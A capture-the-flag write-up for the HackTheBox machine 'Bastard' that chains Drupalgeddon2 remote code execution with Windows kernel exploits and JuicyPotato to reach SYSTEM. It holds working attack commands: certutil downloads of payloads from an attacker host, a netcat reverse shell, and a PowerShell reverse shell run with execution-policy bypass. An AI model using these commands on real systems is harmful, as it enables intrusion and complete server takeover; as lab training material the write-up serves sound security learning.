### **Bastard Write-ups**
Today we’re going to solve another boot2root challenge called “**Bastard**“. Bastard is not overly challenging, however it requires some knowledge of PHP in order to modify and use the proof of concept required for initial entry. This machine demonstrates the potential severity of vulnerabilities in content management systems. 

Level: **Medium**

Since these labs are available on the **HackTheBox** website.

### **Penetration Testing Methodology**

**Reconnaissance**

- Nmap

**Enumeration**

- Searchsploit

**Exploiting**

- Drupal 7.x – Drupalgeddon2 – RCE

**Privilege Escalation**

- Abuse of permission in SeImpersonatePrivilege in the system
- Capture the flag

### **Walkthrough**

### **Reconnaissance**

As always, before we start our scan with nmap, we will put the **IP address of the machine** into our “**/etc/hosts**” and work with the domain “**bastard.htb**“.

We will use the following command to perform a quick scan to all ports.

```
sudo nmap 10.10.10.9 -sS -Pn -n --disable-arp-ping

or

nmap --min-rate 5000 -p- -Pn -n -sS -T5 bastard.htb

or

nmap -T4 -A -p- -oN bastard-nmap 10.10.10.9 -Pn

or
nmap -sV -sC -p80,135,49154 bastard.htb -oN bastard.htb

```

![nmap 1.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/d6875430-eb14-42e7-8063-9f491f29c465/c8c4285e-1ff2-4106-b4ac-b323f1c9fc0d/nmap_1.png)

Afterwards, we will launch another scan
 with scripts and versions, it will be very fast since we will specify 
the ports of the previously detected services.

We can also list that there is a **CMS** deployed with **Drupal 7**.

![nmap.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/d6875430-eb14-42e7-8063-9f491f29c465/95db0008-2e1f-4511-8623-ed23fb802b64/nmap.png)

### **Enumeration**

We access the web resource, it is indeed a **Drupal**.

![webpage.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/d6875430-eb14-42e7-8063-9f491f29c465/d8697fa9-b1cc-4a92-bdee-35a3c7bacfbe/webpage.png)

we found the best Drupal version which Drupal 7.54. This is box is vulnerable RCE 

![drupal version.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/d6875430-eb14-42e7-8063-9f491f29c465/85ccf0e3-53a0-4d11-a1cc-670773a9059f/drupal_version.png)

We use the “**Searchsploit**” tool and list several exploits that allow us to execute remote code (RCE) without authentication.

![metasploit.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/d6875430-eb14-42e7-8063-9f491f29c465/41981b27-79f5-4ffe-bbe9-8dd70e0fece6/metasploit.png)

Bit Google, Github : Drupal 7.54 exploit 

save in your local folder as  ”`drupa7-CVE-2018-7600.py`" (RCE python script)

![Screenshot 2024-05-30 161604.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/d6875430-eb14-42e7-8063-9f491f29c465/444dbf4d-b780-4b2e-a0e9-53632486bfae/Screenshot_2024-05-30_161604.png)

Change permission:

chmod +x `drupa7-CVE-2018-7600.py`

**Exploit**

```jsx
https://github.com/lorddemon/drupalgeddon2

or 
https://github.com/pimps/CVE-2018-7600/blob/master/README.md
```

Usage the exploit:

```jsx
./drupa7-CVE-2018-7600.py
```

Enumeration the box:

```jsx
./drupa7-CVE-2018-7600.py -c whoami http://bastard.htb

List the users:
./drupa7-CVE-2018-7600.py -c 'dir C:\Users\' http://bastard.htb

./drupa7-CVE-2018-7600.py -c 'type C:\Users\x\Desktop\users.txt' http://bastard.htb

 ./drupa7-CVE-2018-7600.py http://10.10.10.9/ -c 'systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"'
```

User enumeration:

![whoami.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/d6875430-eb14-42e7-8063-9f491f29c465/790f4715-b180-4b11-b894-ea303b5c1fa5/whoami.png)

System enumeration:

![system enumeration.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/d6875430-eb14-42e7-8063-9f491f29c465/c7bf8c17-23ee-4a8d-a084-671f4334c5e8/system_enumeration.png)

Users enumeration:

![Users available.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/d6875430-eb14-42e7-8063-9f491f29c465/c0cb8d2d-130b-4657-96ed-d3fc7308bdb4/Users_available.png)

User Flag:

![user flag.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/d6875430-eb14-42e7-8063-9f491f29c465/62ec3812-b4e0-4c40-ae97-f4dea8dc2a7c/user_flag.png)

### Privilege Escalation:

we elevate our permissions to get the system authority/administrator.

Enumerate system info:

```jsx
Enumeratate system info
./drupa7-CVE-2018-7600.py -c systeminfo http://bastard.htb

```

find the Windows-Exploit suggester:

```jsx
locate windows-exploit-suggester.py

cope to your locate folder:
cp windows-exploit-suggester.py /home/kali/HTB/Bastard

update the database:
./windows-exploit-suggester.py --update
```

Get the database info.

run the the windows-exploit-suggester:

```jsx
./windows-exploit-suggester.py -i sysinfo.txt -d 2024-05-30-mssb.xls
```

**Download MS10-059**

We got MS10-059 is vulnerable for kernel. so we need to Google : find Windows-kernel exploits as Chimichurri or MS10-059.exe

Download or save MS10-059.exe in your local folder.

Hosting Webserver

```jsx
python3 -m http.server 80

or

python3 custom-http.server 8080
```

Download the exploit into the window:

```jsx
./drupa7-CVE-2018-7600.py -c 'certutil -urlcache -f http://10.10.14.3/MS10-059.exe ms59.exe' http://bastard.htb
or 
./drupa7-CVE-2018-7600.py -c 'certutil -urlcache -f http://10.10.14.3:8080/MS10-059.exe c:\temp\ms59.exe' http://bastard.htb
```

We created a Temp Folder in C:

![temp folder created.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/d6875430-eb14-42e7-8063-9f491f29c465/7322d067-dccf-42d6-b4af-3bc35d16b64d/temp_folder_created.png)

Uploaded the MS10-59.exe file into temp folder.

![ms10-59 was created.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/d6875430-eb14-42e7-8063-9f491f29c465/b9c719b3-3e3a-4bb9-bd38-0e823b4c9bcc/ms10-59_was_created.png)

Check if the fil saved and confirmed.

```jsx
./drupa7-CVE-2018-7600.py -c 'dir c:\temp' http://bastard.htb
```

![confirmed.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/d6875430-eb14-42e7-8063-9f491f29c465/07c5a581-9c7c-4f4d-981f-0ec26573d080/confirmed.png)

Executing the Shell:

```jsx
./drupa7-CVE-2018-7600.py -c 'c:\temp\ms59.exe 10.10.14.3 443' http://bastard.htb
```

![attacking.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/d6875430-eb14-42e7-8063-9f491f29c465/b4a3572d-b3bb-4a25-b385-70f452686bce/attacking.png)

Rooted the System. Got the root flag.

![rooted the system.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/d6875430-eb14-42e7-8063-9f491f29c465/fec37dc4-beba-433b-a1a7-8941e4cdace7/rooted_the_system.png)

…………………………………………..

## Another RCE to get system authority:

We use the “**Searchsploit**” tool and list several exploits that allow us to execute remote code (RCE) without authentication.

!https://1.bp.blogspot.com/-cnOGb2dAKlA/YAVCBQnn-FI/AAAAAAAAs_g/Khomas42qX8uQKx4h6csEWImy1zllEwdACLcBGAsYHQ/s16000/5.png

We will use the following exploit found in google:

### **Exploit**:

```
https://github.com/lorddemon/drupalgeddon2

or 
https://github.com/pimps/CVE-2018-7600/blob/master/README.md
```

We do a proof of concept and see that the site is vulnerable.

```
python3 drupalgeddon2.py
python3 drupalgeddon2.py -h http://bastard.htb -c 'whoami'

or

python3 drupal.py http://10.10.10.9/ -c "whoami"

python3 drupal.py http://10.10.10.9/ -c 'systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"'
```

!https://1.bp.blogspot.com/--hX5spXddYg/YAVCJMhWQYI/AAAAAAAAs_k/E8BNvL_UjnQRCCZtxcfAC0ypzMW5DukcwCLcBGAsYHQ/s16000/6.png

# Exploiting:

we’re generating a payload to get a reverse shell called shell.exe.

![Screenshot 2024-03-18 180439.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/d6875430-eb14-42e7-8063-9f491f29c465/2ff88238-95d9-4fb6-b5c2-0bef055e7284/Screenshot_2024-03-18_180439.png)

Hosting a web server:

```jsx
python3 custom_http_server.py
```

in Windows:

Create a temp folder:

```jsx
python3 drupal.py -h http://10.10.10.9/ -c 'mkdir c:\temp'
```

![Screenshot 2024-03-18 180631.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/d6875430-eb14-42e7-8063-9f491f29c465/2d41ba7e-d736-43cf-8456-fd97f08ebcb2/Screenshot_2024-03-18_180631.png)

upload the file into our windows:

```jsx
python3 drupal.py http://10.10.10.9/ -c 'certutil -urlcache -f http://10.10.14.3/shell.exe c:\temp\shell.exe'

this worked for me"
python3 drupalgeddon2.py -h  http://10.10.10.9/ -c 'certutil -urlcache -f http://10.10.14.3:8080/rev.exe rev.exe'

```

![Screenshot 2024-03-18 180743.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/d6875430-eb14-42e7-8063-9f491f29c465/29adba3f-d7c5-43fb-a873-3f5942fdcb2d/Screenshot_2024-03-18_180743.png)

Executing the shell:

```jsx
python3 drupal.py http://10.10.10.9/ -c 'c:\temp\shell.exe'

this worked for me:
python3 drupalgeddon2.py -h  http://10.10.10.9/ -c 'rev.exe' 
```

![Screenshot 2024-03-18 180853.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/d6875430-eb14-42e7-8063-9f491f29c465/eec7d519-285a-438e-99cd-8e28d383a400/Screenshot_2024-03-18_180853.png)

we’re in  as nt authrotity: 

this machine is vulnerable to ms16-014.

![Screenshot 2024-03-18 180943.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/d6875430-eb14-42e7-8063-9f491f29c465/2829dfda-c7fb-4a3a-80be-0c2ed8753d22/Screenshot_2024-03-18_180943.png)

## Privilege Escalation:

we’ll use a tool called sherlock.ps1 same as powerup to check what exploit scripts are best to get rooted the box or download from the course tools.

we can also use Windows-exploit-suggester.py

![Screenshot 2024-03-18 182034.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/d6875430-eb14-42e7-8063-9f491f29c465/0599b0a7-2dad-4726-be5e-4693ab41c956/Screenshot_2024-03-18_182034.png)

gedit sherlock.ps1:

add “find-AllVulns” at the bottom of the code.

Transfer the file:

>python -m SimpleHTTPServer 80

Basic PowerShell for Pentesters - https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters

copy the first command:

![Screenshot 2024-03-18 182355.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/d6875430-eb14-42e7-8063-9f491f29c465/9070c01e-5aae-4074-8c8d-c3878b12c4b8/Screenshot_2024-03-18_182355.png)

edit the port number and the sherlock.ps1..

![Screenshot 2024-03-18 182538.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/d6875430-eb14-42e7-8063-9f491f29c465/acdfd8ab-9f9b-44e0-af82-959644d9d465/Screenshot_2024-03-18_182538.png)

Downloading the sherlock.ps1 file in our window machine:

![Screenshot 2024-03-18 182726.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/d6875430-eb14-42e7-8063-9f491f29c465/fa7abe22-8d00-4ef5-80c3-5d6514696a46/Screenshot_2024-03-18_182726.png)

we gonna use the windows-kernel exploits **ms15-051**: Google: github download the zip folder

![Screenshot 2024-03-18 183004.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/d6875430-eb14-42e7-8063-9f491f29c465/948a06b8-ee39-4851-a350-7ba0ffb2055f/Screenshot_2024-03-18_183004.png)

dropping the ms15-051x64.exe file into our transfer folder.

![Screenshot 2024-03-18 183545.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/d6875430-eb14-42e7-8063-9f491f29c465/34b9b511-c545-4412-9fc2-234f73bd7324/Screenshot_2024-03-18_183545.png)

### 

Hosting the file:

python -m SimpleHTTPServer 80

Downloading nc.exe and MS15-051x64.exe via certiutil in windows:

![Screenshot 2024-03-18 191327.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/d6875430-eb14-42e7-8063-9f491f29c465/715f6620-0d77-4f31-9955-0c5daeec9340/Screenshot_2024-03-18_191327.png)

Executing the ms15-051.exe as a system level privileges:

![Screenshot 2024-03-18 191515.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/d6875430-eb14-42e7-8063-9f491f29c465/ac7e241c-675e-460c-8c7a-6a801140aa95/Screenshot_2024-03-18_191515.png)

netcat Listening:

>nc -nvlp 4444

we’re in as system authority

![Screenshot 2024-03-18 191534.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/d6875430-eb14-42e7-8063-9f491f29c465/9a0f1515-9e37-42aa-9ffc-d0691ee84bf9/Screenshot_2024-03-18_191534.png)

………………………………………………………………….

### Exploiting via powershell

We will execute two commands:

1. We will raise in our kali a server with python (*python3 -m http.server 80*), in the file “**Invoke-PowerShellTcpOneLine.ps1**” is the famous https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1 reverse shell (one Liner), we will execute the exploit with the following command that will download our reverse shell.
2. We will execute the second command to run with a bypassed powershell to get our reverse shell to run.

**Command 1:**

Before we’ve transferred, we need to edit our one liner reverse shell, and add our attacker IP and Port #4444 & 5555 respectively.

```
python drupalgeddon2.py -h http://bastard.htb -c 'certutil -urlcache -split -f http://10.10.14.3:8080/Invoke-PowerShellTcpOneLine.ps1 m3.ps1'
```

**Command 2:**

```
python drupalgeddon2.py -h http://bastard.htb -c 'powershell -nop -ep bypass .\m3.ps1'
```

![transfers.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/d6875430-eb14-42e7-8063-9f491f29c465/17cf1ffb-7c4a-4d74-a907-7749b9f440fd/transfers.png)

Hosting web server.

![hosting web server.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/d6875430-eb14-42e7-8063-9f491f29c465/dca1087c-c7cc-49a6-80ae-863bec874523/hosting_web_server.png)

We will have a reverse shell of powershell in our kali.

![2024-06-02 06_58_08-ps.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/d6875430-eb14-42e7-8063-9f491f29c465/de4f8636-3ee3-4382-9f45-5767452b55f1/2024-06-02_06_58_08-ps.png)

### **Privilege Escalation (user and administrator)**

This machine can be exploited in more ways, but I chose this path.

We use the command “**whoami /priv**” to check the privileges with our user and see that we have permissions to the privilege “**SeImpersonatePrivilege**“. We already know this one from other machines that we have solved, we know that we can impersonate the user “**nt authority\system**“.

![2024-06-02 07_01_46-priv.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/d6875430-eb14-42e7-8063-9f491f29c465/29bf7385-dc2e-422c-9293-4f06630314c9/2024-06-02_07_01_46-priv.png)

We check that we are in the operating system since we will need to check the list of CLSID to use the exploit.

As we can see, we are in a **Windows Server 2008 R2**, of which there are several kernel-level exploits that we could also use.

![2024-06-02 07_05_09-systeminfo.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/d6875430-eb14-42e7-8063-9f491f29c465/8cbb2c81-e9ab-431b-bb80-83d215e1e91d/2024-06-02_07_05_09-systeminfo.png)

We download the exploit “**JuicyPotato**” and visit the Github’s CLSID list, we transfer to the victim machine the file “**JuicyPotato.exe**” and the netcat binary “**nc.exe**“.
 Then we use the exploit specifying the path of our netcat and 
specifying our IP address and port to send us a reverse shell as 
“administrator” in a netcat is listening to our kali.

**Exploit and CLSID list**:

```
https://github.com/ohpe/juicy-potato
```

```
certutil -urlcache -split -f http://10.10.14.3/JuicyPotato.exe
certutil -urlcache -split -f http://10.10.14.3/nc.exe
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\inetpub\drupal-7.54\nc.exe -e cmd.exe 10.10.14.3 5555" -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
```

Transferred Juicy potatoes to Windows., and nc.exe and executed juicy pototo.

![2024-06-02 07_11_20-juicypotato.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/d6875430-eb14-42e7-8063-9f491f29c465/b4b9e205-fcb8-4e9f-9e49-ae42bb2aa273/2024-06-02_07_11_20-juicypotato.png)

![2024-06-02 07_14_10-juicy worked.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/d6875430-eb14-42e7-8063-9f491f29c465/63dfc09b-e40a-48bb-bcf2-c1fc07392e9d/2024-06-02_07_14_10-juicy_worked.png)

Great! We are already “**nt authority\system**” and we can read our flags.

we’re in as a system authority:

![2024-06-02 07_15_49-system nt auathority.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/d6875430-eb14-42e7-8063-9f491f29c465/2524dc66-9e7f-411d-b5ee-4449ef6c6096/2024-06-02_07_15_49-system_nt_auathority.png)

Got the root flag.

![2024-06-02 07_17_24-root.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/d6875430-eb14-42e7-8063-9f491f29c465/34b19d87-9c04-42a3-bfca-bbc28c738e3d/2024-06-02_07_17_24-root.png)

**Additional info:**

### Finding CLSIDs

To find CLSIDs and their associated COM objects on a Windows Server 2008 system, you can look in the Windows registry under these paths:

- `HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID`
- `HKEY_CLASSES_ROOT\CLSID`

### Using PowerShell to List CLSIDs

You can use PowerShell to list all CLSIDs on a system. Here's a PowerShell script to enumerate CLSIDs:

```powershell
# Define the CLSID key path
$clsidPath = "HKLM:\SOFTWARE\Classes\CLSID"

# Get all subkeys under CLSID
$clsids = Get-ChildItem -Path $clsidPath

# Display the CLSIDs
foreach ($clsid in $clsids) {
    $defaultProp = Get-ItemProperty -Path $clsid.PSPath -Name '(default)' -ErrorAction SilentlyContinue
    if ($defaultProp) {
        Write-Output "CLSID: $($clsid.PSChildName) - Description: $($defaultProp.'(default)')"
    }
}
```
